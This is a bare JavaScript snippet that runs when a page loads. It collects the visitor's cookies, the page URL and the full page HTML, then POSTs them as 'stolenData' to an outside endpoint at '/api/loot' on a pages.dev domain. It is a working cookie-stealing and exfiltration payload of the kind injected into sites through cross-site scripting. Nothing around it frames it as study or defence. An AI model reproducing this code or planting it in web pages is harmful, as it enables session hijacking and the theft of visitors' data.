window.onload = function() {
    const stolenData = {
        cookies: document.cookie,
        url: window.location.href,
        htmlDump: document.body.innerHTML
    };

    // Send data to the Cloudflare Function running on the SAME domain
    fetch("https://dark-research-lab.pages.dev/api/loot", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(stolenData)
    });
};
